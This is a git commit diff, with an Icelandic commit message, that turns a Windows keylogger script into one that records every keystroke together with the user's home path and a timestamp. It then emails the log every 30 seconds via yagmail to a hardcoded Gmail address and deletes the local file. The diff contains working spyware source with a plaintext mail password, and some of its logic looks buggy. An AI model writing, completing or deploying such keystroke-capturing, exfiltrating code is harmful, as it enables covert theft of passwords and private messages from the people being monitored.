fbc4ca3f988391e00b6d9acda2d9db63122de3a8
Viktor Þór <viktorthorr@gmail.com>
2020-04-06 20:56:38 +0000

    Windows format klárt, yagmail ekki

--- windows.py
+++ windows.py
@@ -2,18 +2,60 @@
 # Keylogger to be used in Windows #
 ###################################
 from pynput.keyboard import Key, Listener
-import logging
+import pynput
+from datetime import datetime
+import os
+import yagmail
+from apscheduler.schedulers.blocking import BlockingScheduler
 
-log_dir = ""
+def sendLog(log):
+    sender_email = "kloggertest42069@gmail.com"
+    receiver_email = "kloggertest42069@gmail.com"
+    subject = "Klogger"
+    sender_password = "rotkiv1234"
 
-# Sennilega best að fjarlægja "logging" dæmið alveg og nota
-# file write statements eftir open() eins og linux meginn.
-logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(message)s')
+    yag = yagmail.SMTP(user=sender_email, password=sender_password)
 
-def on_press(key):
-    if(str(key) == "Key.enter" or str(key) == "Key.tab"):
-        logging.info(str(key) + '\n')
-    logging.info(str(key))
+    contents = [
+    "Klogger of the day"
+    ]
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+
+    yag.send(receiver_email, subject, contents, attachments=log )
+
+def Klogger():
+
+    log = os.environ.get(
+        'pylogger_file',
+        os.path.expanduser('keylog.txt')
+    )
+
+    user = os.path.expanduser("~")
+    timi = datetime.now()
+
+    with open (log, 'a') as f:
+        f.write(str(user) + '\n' + str(timi) + '\n')
+
+    def on_press(key):
+        with open(log, 'a') as f:
+            if(key == Key.enter or key == Key.tab):
+                f.write('{}\n'.format(key))
+            else:
+                f.write('{} - '.format(key))
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+sched = BlockingScheduler()
+Klogger()
+
+@sched.scheduled_job('interval', seconds=30)
+def timed_job():
+        homedir = os.path.expanduser("~")
+        homedir = homedir + "keylog.txt"
+
+        sendLog(homedir)
+        os.remove(homedir)
+
+
+sched.start()
